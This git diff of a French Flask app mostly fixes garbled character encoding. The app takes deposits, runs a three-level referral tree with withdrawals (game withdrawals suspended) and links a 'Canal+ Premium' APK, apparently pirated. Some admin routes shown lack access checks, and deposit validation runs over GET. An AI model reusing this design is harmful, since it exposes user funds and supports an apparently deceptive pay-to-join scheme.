 def get_global_stats():
     total_users = db.session.query(func.count(User.id)).scalar() or 0
     total_deposits = db.session.query(func.sum(Depot.montant)).filter(Depot.statut=="valide").scalar() or 0
-    total_withdrawn = db.session.query(func.sum(User.total_retrait)).scalar() or 0  # ÔåÉ On utilise maintenant total_retrait
+    total_withdrawn = db.session.query(func.sum(User.total_retrait)).scalar() or 0  # ← On utilise maintenant total_retrait
     return total_users, total_deposits, total_withdrawn
 
 
 # --------------------------------------
-# 1´©ÅÔâú Page dashboard_bloque (initiation paiement)
+# 1️⃣ Page dashboard_bloque (initiation paiement)
 # --------------------------------------
 from urllib.parse import urlencode
 
@@ -2237,25 +2360,25 @@ def webhook_soleaspay():
 def bkapay_retour():
     status = request.args.get("status")
 
-    # ­ƒöÉ R├®cup├®ration de l'utilisateur connect├®
-    user = get_logged_in_user()  # Assure-toi que cette fonction retourne l'utilisateur connect├®
+    # 🔐 Récupération de l'utilisateur connecté
+    user = get_logged_in_user()  # Assure-toi que cette fonction retourne l'utilisateur connecté
 
     if status == "success":
-        flash("Paiement re├ºu ! Votre compte sera activ├® automatiquement.", "success")
+        flash("Paiement reçu ! Votre compte sera activé automatiquement.", "success")
 
 
         db.session.commit()
         return redirect(url_for("dashboard_pay_ok"))
 
-    # Paiement ├®chou├® ou annul├®
-    flash("Paiement ├®chou├® ou annul├®.", "danger")
+    # Paiement échoué ou annulé
+    flash("Paiement échoué ou annulé.", "danger")
     return redirect(url_for("dashboard_bloque"))
 
 @app.route("/dashboard/pay/ok", methods=["GET"])
 def dashboard_pay_ok():
     user_id = session.get("user_id")
     if not user_id:
-        flash("Vous devez vous connecter pour acc├®der au dashboard.", "danger")
+        flash("Vous devez vous connecter pour accéder au dashboard.", "danger")
         return redirect(url_for("connexion_page"))
 
     user = db.session.get(User, user_id)
@@ -2264,16 +2387,16 @@ def dashboard_pay_ok():
         flash("Session invalide, veuillez vous reconnecter.", "danger")
         return redirect(url_for("connexion_page"))
 
-    # Ô£à MARQUER D├ëFINITIVEMENT L'ACC├êS PAY OK
+    # ✅ MARQUER DÉFINITIVEMENT L'ACCÈS PAY OK
     if not user.has_seen_pay_ok:
         user.has_seen_pay_ok = True
         db.session.commit()
 
-    # ­ƒöù Lien de parrainage
+    # 🔗 Lien de parrainage
     referral_code = user.username
     referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"
 
-    # ­ƒôè Stats globales
+    # 📊 Stats globales
     total_users, total_deposits, total_withdrawn = get_global_stats()
     revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)
 
@@ -2307,7 +2430,7 @@ def whatsapp_channel():
 
 from datetime import datetime, timedelta
 
-# Assure-toi que ces constantes sont d├®finies en haut de ton app.py
+# Assure-toi que ces constantes sont définies en haut de ton app.py
 MAX_GAIN = 500.0
 CYCLE_DAYS = 3
 WINDOW_HOURS = 24
@@ -2343,7 +2466,7 @@ def dashboard_page():
     can_play = False
     next_date = None
     
-    # Date de r├®f├®rence pour le cycle
+    # Date de référence pour le cycle
     base_date = user.last_play_date or user.date_creation
 
     if base_date and not is_blocked_500 and not no_rounds_left:
@@ -2355,13 +2478,13 @@ def dashboard_page():
         elif next_date <= now <= deadline_date:
             can_play = True
         elif now > deadline_date:
-            # Fen├¬tre rat├®e : On applique la p├®nalit├® imm├®diatement
+            # Fenêtre ratée : On applique la pénalité immédiatement
             user.remaining_rounds -= 1
             user.last_play_date = next_date 
             db.session.commit()
             return redirect(url_for("dashboard_page"))
 
-    # Cas sp├®cial : Premier jeu apr├¿s inscription
+    # Cas spécial : Premier jeu après inscription
     if not user.last_play_date and not no_rounds_left and not is_blocked_500:
         can_play = True
 
@@ -2400,7 +2523,7 @@ def user_is_activated(user):
         Depot.statut == "valide"
     ).first() is not None
 
-# ===== D├®corateur admin =====
+# ===== Décorateur admin =====
 def admin_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -2414,7 +2537,7 @@ def admin_users():
     user = get_logged_in_admin()
 
     if not user:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("admin_finance"))
 
     users = User.query.order_by(User.date_creation.desc()).all()
@@ -2429,7 +2552,7 @@ def admin_users():
             "username": u.username,
             "email": u.email,
             "phone": u.phone,
-            "parrain": u.parrain if u.parrain else "ÔÇö",
+            "parrain": u.parrain if u.parrain else "—",
             "niveau1": niveau1,
             "niveau2": niveau2,
             "niveau3": niveau3,
@@ -2444,7 +2567,7 @@ def admin_users_inactifs():
     user = get_logged_in_admin()
 
     if not user:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("admin_finance"))
 
     inactifs = User.query.filter_by(premier_depot=False).order_by(User.date_creation.desc()).all()
@@ -2461,7 +2584,7 @@ def admin_users_actifs():
     user = get_logged_in_admin()
 
     if not user:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("admin_finance"))
 
     actifs = User.query.filter_by(premier_depot=True).order_by(User.date_creation.desc()).all()
@@ -2478,7 +2601,7 @@ def admin_login():
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
-        # V├®rifie l'utilisateur admin
+        # Vérifie l'utilisateur admin
         user = User.query.filter_by(username=username, is_admin=True).first()
         if user and check_password_hash(user.password, password):
             session["admin_id"] = user.id
@@ -2507,33 +2630,33 @@ def admin_parrainage():
             flash("Utilisateur introuvable.", "danger")
             return redirect(url_for("admin_parrainage"))
 
-        # Ô£à Modifier USERNAME
+        # ✅ Modifier USERNAME
         if nouveau_username and nouveau_username != user.username:
 
-            # V├®rification format (lettres minuscules + chiffres seulement)
+            # Vérification format (lettres minuscules + chiffres seulement)
             if not nouveau_username.isalnum() or not nouveau_username.islower():
                 flash("Le username doit contenir uniquement lettres minuscules et chiffres.", "danger")
                 return redirect(url_for("admin_parrainage"))
 
-            # V├®rification unicit├®
+            # Vérification unicité
             username_existe = User.query.filter(
                 User.username == nouveau_username,
                 User.id != user.id
             ).first()
 
             if username_existe:
-                flash("Ce username est d├®j├á utilis├®.", "danger")
+                flash("Ce username est déjà utilisé.", "danger")
                 return redirect(url_for("admin_parrainage"))
 
             ancien_username = user.username
             user.username = nouveau_username
 
-            # ­ƒöÑ Mettre ├á jour tous ceux qui ont cet ancien username comme parrain
+            # 🔥 Mettre à jour tous ceux qui ont cet ancien username comme parrain
             filleuls = User.query.filter_by(parrain=ancien_username).all()
             for f in filleuls:
                 f.parrain = nouveau_username
 
-        # Ô£à Modifier PHONE
+        # ✅ Modifier PHONE
         if nouveau_phone and nouveau_phone != user.phone:
             phone_existe = User.query.filter(
                 User.phone == nouveau_phone,
@@ -2541,12 +2664,12 @@ def admin_parrainage():
             ).first()
 
             if phone_existe:
-                flash("Num├®ro d├®j├á utilis├®.", "danger")
+                flash("Numéro déjà utilisé.", "danger")
                 return redirect(url_for("admin_parrainage"))
 
             user.phone = nouveau_phone
 
-        # Ô£à Modifier PARRAIN
+        # ✅ Modifier PARRAIN
         if nouveau_parrain == "":
             user.parrain = None
         else:
@@ -2556,13 +2679,13 @@ def admin_parrainage():
                 return redirect(url_for("admin_parrainage"))
 
             if nouveau_parrain == user.username:
-                flash("Un utilisateur ne peut pas ├¬tre son propre parrain.", "danger")
+                flash("Un utilisateur ne peut pas être son propre parrain.", "danger")
                 return redirect(url_for("admin_parrainage"))
 
             user.parrain = nouveau_parrain
 
         db.session.commit()
-        flash(f"Ô£à Mise ├á jour effectu├®e pour {user.username}.", "success")
+        flash(f"✅ Mise à jour effectuée pour {user.username}.", "success")
         return redirect(url_for("admin_parrainage"))
 
     return render_template("admin_parrainage.html", users=users)
@@ -2587,7 +2710,7 @@ def about():
 
 def get_service_name(service_id):
     """
-    Cherche le nom du service dans tous les pays pour un ID donn├®.
+    Cherche le nom du service dans tous les pays pour un ID donné.
     """
     for country_services in SERVICES.values():
         for s in country_services:
@@ -2599,12 +2722,12 @@ def get_service_name(service_id):
 def mes_retraits():
     user = get_logged_in_user()
 
-    # CORRECTION : Filtrer par user_id au lieu du num├®ro de t├®l├®phone
+    # CORRECTION : Filtrer par user_id au lieu du numéro de téléphone
     retraits = Retrait.query.filter_by(user_id=user.id).order_by(Retrait.date.desc()).all()
 
     # Ajouter le nom lisible pour chaque retrait
     for r in retraits:
-        # On s'assure que service_name est bien d├®fini pour le template
+        # On s'assure que service_name est bien défini pour le template
         r.service_name = get_service_name(r.payment_method)
 
     return render_template("mes_retraits.html", retraits=retraits, user=user)
@@ -2618,11 +2741,11 @@ from datetime import date
 def click_jeudi():
     user = get_logged_in_user()
 
-    # V├®rifier si c'est jeudi
+    # Vérifier si c'est jeudi
     if date.today().weekday() != 3:  # 0 = lundi, 3 = jeudi
         return render_template("pas_jeudi.html", user=user)
 
-    # V├®rifier si l'utilisateur a d├®j├á fait le click cette semaine
+    # Vérifier si l'utilisateur a déjà fait le click cette semaine
     debut_semaine = date.today() - timedelta(days=date.today().weekday())  # lundi de cette semaine
     deja_fait = ClickJeudiReponse.query.filter(
         ClickJeudiReponse.user_id == user.id,
@@ -2655,7 +2778,7 @@ def whatsapp_number():
     number = request.form.get("number").strip()
 
     if not number.startswith("+") or not number[1:].isdigit() or len(number) < 10:
-        flash("Num├®ro invalide !", "error")
+        flash("Numéro invalide !", "error")
         return redirect("/dashboard")
 
     user.whatsapp_number = number
@@ -2713,7 +2836,7 @@ def apk_canal_page():
     canal_apk = {
         "name": "Canal+ Premium",
         "filename": "canal_plus_vavoo.apk",
-        "link": "https://drive.google.com/uc?id=15G5lmyNMw2xYTm_XvvhIX77uBqT99lLq", # Lien direct vers le t├®l├®chargement
+        "link": "https://drive.google.com/uc?id=15G5lmyNMw2xYTm_XvvhIX77uBqT99lLq", # Lien direct vers le téléchargement
         "reference": "Vavoo.to"
     }
     return render_template("apk_canal.html", app=canal_apk)
@@ -2773,7 +2896,7 @@ def retrait_page():
             montant = float(request.form.get("montant", 0))
             service_id = int(request.form.get("payment_method", 0))
         except (ValueError, TypeError):
-            flash("Donn├®es de formulaire invalides.", "danger")
+            flash("Données de formulaire invalides.", "danger")
             return redirect(url_for("retrait_page"))
 
         wallet = request.form.get("phone", "").strip()
@@ -2783,7 +2906,7 @@ def retrait_page():
         # VALIDATIONS
         # ==========================
         if montant < MIN_RETRAIT or montant > MAX_RETRAIT:
-            flash(f"Le montant doit ├¬tre entre {MIN_RETRAIT} et {MAX_RETRAIT} XOF.", "danger")
+            flash(f"Le montant doit être entre {MIN_RETRAIT} et {MAX_RETRAIT} XOF.", "danger")
             return redirect(url_for("retrait_page"))
 
         montant_total = montant + FRAIS
@@ -2798,13 +2921,13 @@ def retrait_page():
             return redirect(url_for("retrait_page"))
 
         # ==========================
-        # ­ƒöÉ PIN CHECK
+        # 🔐 PIN CHECK
         # ==========================
         if not user.pin_code:
-            flash("Veuillez d├®finir votre code PIN dans votre profil.", "danger")
+            flash("Veuillez définir votre code PIN dans votre profil.", "danger")
             return redirect(url_for("profile_page"))
 
-        # On utilise check_password_hash pour comparer le PIN hach├®
+        # On utilise check_password_hash pour comparer le PIN haché
         if not check_password_hash(user.pin_code, pin):
             flash("Code PIN incorrect.", "danger")
             return redirect(url_for("retrait_page"))
@@ -2821,7 +2944,7 @@ def retrait_page():
             return redirect(url_for("retrait_page"))
 
         # ==========================
-        # SAVE DB (S├®curis├®)
+        # SAVE DB (Sécurisé)
         # ==========================
         try:
             nouveau_retrait = Retrait(
@@ -2837,17 +2960,17 @@ def retrait_page():
 
             db.session.add(nouveau_retrait)
 
-            # Mise ├á jour des soldes
+            # Mise à jour des soldes
             user.solde_parrainage = float(user.solde_parrainage) - montant_total
             user.total_retrait = (float(user.total_retrait or 0)) + montant
 
             db.session.commit()
-            flash("Retrait effectu├® avec succ├¿s Ô£à", "success")
+            flash("Retrait effectué avec succès ✅", "success")
             return redirect(url_for("mes_retraits"))
 
         except Exception as e:
             db.session.rollback()
-            print(f"ÔØî ERREUR STOCKAGE : {str(e)}")
+            print(f"❌ ERREUR STOCKAGE : {str(e)}")
             flash("Erreur lors de l'enregistrement du retrait.", "danger")
             return redirect(url_for("retrait_page"))
 
@@ -2860,10 +2983,10 @@ def retrait_casino_page():
         return redirect(url_for('login'))
 
     MIN_RETRAIT = 500
-    # On s'assure que bonus_total est trait├® comme un nombre
+    # On s'assure que bonus_total est traité comme un nombre
     bonus_total = float(user.bonus or 0)
 
-    # R├®cup├®rer les services de paiement du pays de l'utilisateur
+    # Récupérer les services de paiement du pays de l'utilisateur
     country_code = COUNTRY_CODE.get(user.country)
     services = SERVICES.get(country_code, [])
 
@@ -2874,7 +2997,7 @@ def retrait_casino_page():
 
         # 1. VALIDATIONS DE BASE
         if not wallet or len(wallet) < 8:
-            flash("Num├®ro de t├®l├®phone invalide.", "danger")
+            flash("Numéro de téléphone invalide.", "danger")
             return redirect(url_for("retrait_casino_page"))
 
         if montant < MIN_RETRAIT:
@@ -2890,12 +3013,12 @@ def retrait_casino_page():
         response = envoyer_retrait_soleaspay(service_id, wallet, montant)
 
         if response and response.get("success") == True:
-            # 3. ENREGISTREMENT ET D├ëDUCTION
+            # 3. ENREGISTREMENT ET DÉDUCTION
             try:
-                # On d├®duit le solde
+                # On déduit le solde
                 user.bonus -= montant
                 
-                # On cr├®e la trace du retrait
+                # On crée la trace du retrait
                 nouveau_retrait = Retrait(
                     user_id=user.id,
                     montant=montant,
@@ -2910,14 +3033,14 @@ def retrait_casino_page():
                 db.session.add(nouveau_retrait)
                 db.session.commit()
 
-                flash(f"Retrait de {montant} XOF envoy├® avec succ├¿s vers {wallet} !", "success")
+                flash(f"Retrait de {montant} XOF envoyé avec succès vers {wallet} !", "success")
                 return redirect(url_for("dashboard_page"))
                 
             except Exception as e:
                 db.session.rollback()
-                flash("Erreur lors de la mise ├á jour du solde.", "danger")
+                flash("Erreur lors de la mise à jour du solde.", "danger")
         else:
-            error_msg = response.get('message', '├ëchec de la transaction API') if response else "Service indisponible"
+            error_msg = response.get('message', 'Échec de la transaction API') if response else "Service indisponible"
             flash(f"Erreur : {error_msg}", "danger")
 
     return render_template(
@@ -2940,27 +3063,27 @@ def reset_soldes():
             u.solde_jeux = 100
         
         db.session.commit()
-        return f"Succ├¿s : {nombre} soldes ont ├®t├® r├®initialis├®s ├á 100 XOF."
+        return f"Succès : {nombre} soldes ont été réinitialisés à 100 XOF."
     except Exception as e:
         db.session.rollback()
-        return f"Erreur lors de la mise ├á jour : {str(e)}"
+        return f"Erreur lors de la mise à jour : {str(e)}"
 
 @app.route("/admin/stats-jeux")
 def stats_jeux():
-    # Tout calcul de base de donn├®es doit ├¬tre ├á l'int├®rieur de la fonction
+    # Tout calcul de base de données doit être à l'intérieur de la fonction
     
     # 1. On compte les utilisateurs (Plus de 300 XOF)
     nb_joueurs_riches = User.query.filter(User.solde_jeux > 300).count()
     
-    # 2. On calcule la somme cumul├®e
-    # Note : Assure-toi d'avoir import├® 'func' : from sqlalchemy import func
+    # 2. On calcule la somme cumulée
+    # Note : Assure-toi d'avoir importé 'func' : from sqlalchemy import func
     somme_totale = db.session.query(func.sum(User.solde_jeux)).filter(User.solde_jeux > 300).scalar() or 0
     
     return f"""
     <div style="font-family: sans-serif; padding: 20px; border-left: 5px solid #5a57e3; background: #f8fafc;">
         <h2 style="color: #5a57e3;">Statistiques Solde Jeux</h2>
         <p><b>Utilisateurs (> 300 XOF) :</b> {nb_joueurs_riches}</p>
-        <p><b>Masse mon├®taire cumul├®e :</b> {somme_totale:,.0f} XOF</p>
+        <p><b>Masse monétaire cumulée :</b> {somme_totale:,.0f} XOF</p>
     </div>
     """
 
@@ -2970,7 +3093,7 @@ def retrait_jeux_page():
     user = get_logged_in_user()
     
     # --- CONFIGURATION DE SUSPENSION ---
-    MAINTENANCE_RETRAIT = True  # Mettre ├á False pour r├®activer
+    MAINTENANCE_RETRAIT = True  # Mettre à False pour réactiver
     # ------------------------------------
 
     MIN_RETRAIT = 4000
@@ -2981,7 +3104,7 @@ def retrait_jeux_page():
     services = SERVICES.get(country_code, [])
 
     if request.method == "POST":
-        # S├®curit├® serveur : Bloque le traitement m├¬me si le HTML est modifi├®
+        # Sécurité serveur : Bloque le traitement même si le HTML est modifié
         if MAINTENANCE_RETRAIT:
             flash("Action impossible : Les retraits sont actuellement suspendus.", "danger")
             return redirect(url_for("retrait_jeux_page"))
@@ -2991,11 +3114,11 @@ def retrait_jeux_page():
             service_id = int(request.form.get("payment_method"))
             numero_retrait = request.form.get("wallet", "").strip()
         except (ValueError, TypeError):
-            flash("Donn├®es invalides.", "danger")
+            flash("Données invalides.", "danger")
             return redirect(url_for("retrait_jeux_page"))
 
         if not numero_retrait:
-            flash("Veuillez saisir un num├®ro de r├®ception.", "danger")
+            flash("Veuillez saisir un numéro de réception.", "danger")
             return redirect(url_for("retrait_jeux_page"))
 
         if montant < MIN_RETRAIT:
@@ -3017,10 +3140,10 @@ def retrait_jeux_page():
         response = envoyer_retrait_soleaspay(service_id, numero_retrait, montant)
 
         if not response or response.get("success") is not True:
-            flash(f"Erreur : {response.get('message', '├ëchec de la transaction')}", "danger")
+            flash(f"Erreur : {response.get('message', 'Échec de la transaction')}", "danger")
             return redirect(url_for("retrait_jeux_page"))
 
-        # Enregistrement en base de donn├®es
+        # Enregistrement en base de données
         nouveau_retrait = Retrait(
             user_id=user.id,
             montant=montant,
@@ -3036,7 +3159,7 @@ def retrait_jeux_page():
         db.session.add(nouveau_retrait)
         db.session.commit()
 
-        flash(f"Retrait de {montant} XOF r├®ussi vers {numero_retrait}.", "success")
+        flash(f"Retrait de {montant} XOF réussi vers {numero_retrait}.", "success")
         return redirect(url_for("dashboard_page"))
 
     return render_template(
@@ -3051,7 +3174,7 @@ def retrait_jeux_page():
 
 
 def get_team_total(user):
-    # 1. Niveau 1 : On ne r├®cup├¿re que les usernames pour ├®conomiser la RAM
+    # 1. Niveau 1 : On ne récupère que les usernames pour économiser la RAM
     niveau1_data = User.query.with_entities(User.username).filter_by(parrain=user.username).all()
     if not niveau1_data:
         return 0
@@ -3059,12 +3182,12 @@ def get_team_total(user):
     usernames_n1 = [u.username for u in niveau1_data]
     total = len(usernames_n1)
 
-    # 2. Niveau 2 : On r├®cup├¿re aussi uniquement les usernames
+    # 2. Niveau 2 : On récupère aussi uniquement les usernames
     niveau2_data = User.query.with_entities(User.username).filter(User.parrain.in_(usernames_n1)).all()
     total += len(niveau2_data)
 
     if niveau2_data:
-        # 3. Niveau 3 : Ici ta logique .count() est d├®j├á parfaite
+        # 3. Niveau 3 : Ici ta logique .count() est déjà parfaite
         usernames_n2 = [u.username for u in niveau2_data]
         niveau3_count = User.query.filter(User.parrain.in_(usernames_n2)).count()
         total += niveau3_count
@@ -3086,7 +3209,7 @@ def profile_page():
                 file.save(filepath)
                 user.profile_image = filename
                 db.session.commit()
-                flash("Photo mise ├á jour !", "success")
+                flash("Photo mise à jour !", "success")
 
         elif "update_pin" in request.form:
             pin = request.form.get("pin")
@@ -3100,7 +3223,7 @@ def profile_page():
             else:
                 user.pin_code = generate_password_hash(pin)
                 db.session.commit()
-                flash("Code PIN mis ├á jour ! ­ƒöÉ", "success")
+                flash("Code PIN mis à jour ! 🔐", "success")
         return redirect(url_for("profile_page"))
 
     profile_pic = user.profile_image if user.profile_image else 'default.png'
@@ -3170,10 +3293,10 @@ def retrait_points_page():
 
         payment_method = request.form.get("payment_method")
         if not payment_method:
-            flash("Veuillez s├®lectionner un mode de paiement.", "danger")
+            flash("Veuillez sélectionner un mode de paiement.", "danger")
             return redirect(url_for("retrait_points_page"))
 
-        # Cr├®er la demande de retrait (├á traiter par admin si n├®cessaire)
+        # Créer la demande de retrait (à traiter par admin si nécessaire)
         retrait = RetraitPoints(
             user_id=user.id,
             points_utilises=points_utilisables,
@@ -3182,11 +3305,11 @@ def retrait_points_page():
         )
         db.session.add(retrait)
 
-        # D├®duire les points utilis├®s
+        # Déduire les points utilisés
         user.points = total_points - points_utilisables
         db.session.commit()
 
-        flash(f"Votre demande de retrait de {montant_xof} XOF a ├®t├® enregistr├®e.", "success")
+        flash(f"Votre demande de retrait de {montant_xof} XOF a été enregistrée.", "success")
         return redirect(url_for("retrait_points_page"))
 
     return render_template(
@@ -3201,7 +3324,7 @@ def retrait_points_page():
 def wheel():
     user = get_logged_in_user()
 
-    # V├®rifier si lÔÇÖutilisateur a d├®j├á tourn├® la roue
+    # Vérifier si l’utilisateur a déjà tourné la roue
     if user.has_spun_wheel:
         already_spun = True
     else:
@@ -3215,15 +3338,15 @@ import random
 def spin_wheel():
     user = get_logged_in_user()
 
-    # Si d├®j├á tourn├® ÔåÆ refus
+    # Si déjà tourné → refus
     if user.has_spun_wheel:
-        return jsonify({"status": "error", "message": "Vous avez d├®j├á utilis├® votre chance !"})
+        return jsonify({"status": "error", "message": "Vous avez déjà utilisé votre chance !"})
 
     import random
 
     values = [0, 50, 80, 130, 150, 180, 200, 220, 250, 300, 340, 460]
 
-    # G├®n├®ration pond├®r├®e (rare, commun)
+    # Génération pondérée (rare, commun)
     weighted = []
     for v in values:
         if v in [250, 300, 340, 460]:
@@ -3235,7 +3358,7 @@ def spin_wheel():
 
     reward = random.choice(weighted)
 
-    # Enregistrer que le joueur a d├®j├á jou├®
+    # Enregistrer que le joueur a déjà joué
     user.has_spun_wheel = True
     user.solde_revenu += reward
     db.session.commit()
@@ -3249,7 +3372,7 @@ def team_page():
     referral_code = user.username
     referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"
 
-    # On ne r├®cup├¿re que les infos n├®cessaires pour l'affichage (Username, Phone, Pays, Premier_depot)
+    # On ne récupère que les infos nécessaires pour l'affichage (Username, Phone, Pays, Premier_depot)
     # Niveau 1
     level1 = User.query.with_entities(
         User.username, User.phone, User.country, User.premier_depot, User.date_creation
@@ -3292,27 +3415,27 @@ def team_page():
 # ===== Page de connexion admin =====
 @app.route("/admin/finance", methods=["GET", "POST"])
 def admin_finance():
-    submitted = False  # Sert ├á afficher le loader
+    submitted = False  # Sert à afficher le loader
     if request.method == "POST":
         submitted = True
         username = request.form.get("username")
         password = request.form.get("password")
 
-        # V├®rifie l'utilisateur admin
+        # Vérifie l'utilisateur admin
         user = User.query.filter_by(username=username, is_admin=True).first()
         if user and check_password_hash(user.password, password):
             session["admin_id"] = user.id  # Stocke l'id de l'admin
-            # Redirection vers admin_deposits apr├¿s connexion
+            # Redirection vers admin_deposits après connexion
             return redirect(url_for("admin_deposits"))
         else:
             flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
             # Reste sur la page avec le message flash
             return render_template("admin_finance.html", submitted=False)
 
-    # GET ÔåÆ formulaire normal
+    # GET → formulaire normal
     return render_template("admin_finance.html", submitted=submitted)
 
-# ===== D├®tection de l'admin connect├® =====
+# ===== Détection de l'admin connecté =====
 def get_logged_in_admin():
     admin_id = session.get("admin_id")
     if admin_id:
@@ -3330,16 +3453,16 @@ from sqlalchemy import func
 def admin_deposits():
     user = get_logged_in_admin()
     if not user:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("admin_finance"))
 
     page = request.args.get("page", 1, type=int)
     PER_PAGE = 50
 
-    # 1. UTILISATEURS PAGIN├ëS
+    # 1. UTILISATEURS PAGINÉS
     users_paginated = User.query.order_by(User.date_creation.desc()).paginate(page=page, per_page=PER_PAGE, error_out=False)
     
-    # S├®paration Actifs/Inactifs de la page courante
+    # Séparation Actifs/Inactifs de la page courante
     actifs = [u for u in users_paginated.items if u.premier_depot]
     inactifs = [u for u in users_paginated.items if not u.premier_depot]
 
@@ -3347,7 +3470,7 @@ def admin_deposits():
     total_actifs = User.query.filter_by(premier_depot=True).count()
     total_inactifs = User.query.filter_by(premier_depot=False).count()
 
-    # 2. D├ëPOTS EN ATTENTE (Filtrage sur les nouveaux utilisateurs)
+    # 2. DÉPOTS EN ATTENTE (Filtrage sur les nouveaux utilisateurs)
     subquery = (
         db.session.query(func.max(Depot.id).label("last_id"))
         .join(User, Depot.user_name == User.username)
@@ -3361,7 +3484,7 @@ def admin_deposits():
         .order_by(Depot.date.desc()).all()
     )
 
-    # 3. RETRAITS (Version corrig├®e avec jointure)
+    # 3. RETRAITS (Version corrigée avec jointure)
     retraits_paginated = (
         db.session.query(Retrait, User.username)
         .join(User, Retrait.user_id == User.id)
@@ -3394,32 +3517,32 @@ def valider_depot(depot_id):
 
     depot = Depot.query.get_or_404(depot_id)
 
-    # User concern├® par le d├®p├┤t via username
+    # User concerné par le dépôt via username
     user = User.query.filter_by(username=depot.user_name).first()
 
     if not user:
         flash("Utilisateur introuvable.", "danger")
         return redirect(url_for("admin_deposits"))
 
-    # Si d├®j├á valid├®
+    # Si déjà validé
     if depot.statut == "valide":
-        flash("Ce d├®p├┤t est d├®j├á valid├®.", "warning")
+        flash("Ce dépôt est déjà validé.", "warning")
         return redirect(url_for("admin_deposits"))
 
-    # V├®rifier si l'utilisateur n'a jamais eu de d├®p├┤t valid├® avant
+    # Vérifier si l'utilisateur n'a jamais eu de dépôt validé avant
     premier_depot_valide = not Depot.query.filter_by(
         user_name=user.username,
         statut="valide"
     ).first()
 
-    # Valider le d├®p├┤t
+    # Valider le dépôt
     depot.statut = "valide"
 
-    # Cr├®diter le compte
+    # Créditer le compte
     user.solde_depot += depot.montant
     user.solde_total += depot.montant
 
-    # Premier d├®p├┤t
+    # Premier dépôt
     if premier_depot_valide:
         user.premier_depot = True
 
@@ -3429,7 +3552,7 @@ def valider_depot(depot_id):
 
     db.session.commit()
 
-    flash("D├®p├┤t valid├® et cr├®dit├® avec succ├¿s !", "success")
+    flash("Dépôt validé et crédité avec succès !", "success")
     return redirect(url_for("admin_deposits"))
 
 @app.route("/admin/deposits/rejeter/<int:depot_id>")
@@ -3439,13 +3562,13 @@ def rejeter_depot(depot_id):
     depot = Depot.query.get_or_404(depot_id)
 
     if depot.statut in ["valide", "rejete"]:
-        flash("Ce d├®p├┤t a d├®j├á ├®t├® trait├®.", "warning")
+        flash("Ce dépôt a déjà été traité.", "warning")
         return redirect(url_for("admin_deposits"))
 
     depot.statut = "rejete"
     db.session.commit()
 
-    flash("D├®p├┤t rejet├® avec succ├¿s.", "danger")
+    flash("Dépôt rejeté avec succès.", "danger")
     return redirect(url_for("admin_deposits"))
 
 @app.route("/admin/retraits")
@@ -3453,10 +3576,10 @@ def admin_retraits():
 
     user = get_logged_in_admin()
     if not user:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("admin_finance"))
 
-    # R├®cup├®ration avec join
+    # Récupération avec join
     retraits_query = (
         db.session.query(Retrait, User.username)
         .join(User, User.phone == Retrait.phone)
@@ -3486,18 +3609,18 @@ def valider_retrait(retrait_id):
         flash("Utilisateur introuvable.", "danger")
         return redirect(url_for("admin_retraits"))
 
-    if retrait.statut == "valid├®":
-        flash("Ce retrait a d├®j├á ├®t├® valid├®.", "info")
+    if retrait.statut == "validé":
+        flash("Ce retrait a déjà été validé.", "info")
         return redirect(url_for("admin_retraits"))
 
-    retrait.statut = "valid├®"
+    retrait.statut = "validé"
 
     # Total retrait
     user.total_retrait += retrait.montant + (retrait.frais or 0)
 
     db.session.commit()
 
-    flash("Retrait valid├® avec succ├¿s !", "success")
+    flash("Retrait validé avec succès !", "success")
     return redirect(url_for("admin_retraits"))
 
 @app.route("/admin/retraits/refuser/<int:retrait_id>")
@@ -3511,28 +3634,28 @@ def refuser_retrait(retrait_id):
         flash("Utilisateur introuvable.", "danger")
         return redirect(url_for("admin_retraits"))
 
-    if retrait.statut == "refus├®":
-        flash("Ce retrait a d├®j├á ├®t├® refus├®.", "info")
+    if retrait.statut == "refusé":
+        flash("Ce retrait a déjà été refusé.", "info")
         return redirect(url_for("admin_retraits"))
 
-    # Recr├®diter
+    # Recréditer
     user.solde_parrainage += (retrait.montant + (retrait.frais or 0))
-    retrait.statut = "refus├®"
+    retrait.statut = "refusé"
 
     db.session.commit()
 
-    flash("Retrait refus├® et montant recr├®dit├® ├á lÔÇÖutilisateur.", "warning")
+    flash("Retrait refusé et montant recrédité à l’utilisateur.", "warning")
     return redirect(url_for("admin_retraits"))
 
 @app.route("/taches/questions-lundi", methods=["GET", "POST"])
 def questions_lundi():
-    user = get_logged_in_user()  # r├®cup├¿re l'utilisateur connect├®
+    user = get_logged_in_user()  # récupère l'utilisateur connecté
 
-    # V├®rifier si aujourd'hui est lundi (0 = lundi)
+    # Vérifier si aujourd'hui est lundi (0 = lundi)
     if date.today().weekday() != 0:
         return render_template("pas_lundi.html", user=user)
 
-    # V├®rifier si l'utilisateur a d├®j├á particip├® aujourd'hui
+    # Vérifier si l'utilisateur a déjà participé aujourd'hui
     deja_fait = QuestionReponse.query.filter_by(
         user_id=user.id,
         date=date.today()
@@ -3541,7 +3664,7 @@ def questions_lundi():
     if deja_fait:
         return render_template("deja_fait.html", user=user)
 
-    # S├®lectionner 5 questions al├®atoires
+    # Sélectionner 5 questions aléatoires
     questions = Question.query.order_by(db.func.random()).limit(5).all()
 
     if request.method == "POST":
@@ -3551,7 +3674,7 @@ def questions_lundi():
             if user_answer == q.correct_answer.lower():
                 score += 5  # Chaque question correcte = 5 points
 
-        # Ajouter les points ├á l'utilisateur
+        # Ajouter les points à l'utilisateur
         user.points += score
         db.session.commit()
 
@@ -3560,9 +3683,9 @@ def questions_lundi():
         db.session.add(reponse)
         db.session.commit()
 
-        # Pr├®parer le message
+        # Préparer le message
         if score == 25:
-            message = "Bravo ! Vous avez r├®pondu correctement ├á toutes les questions et gagn├® 25 points !"
+            message = "Bravo ! Vous avez répondu correctement à toutes les questions et gagné 25 points !"
         else:
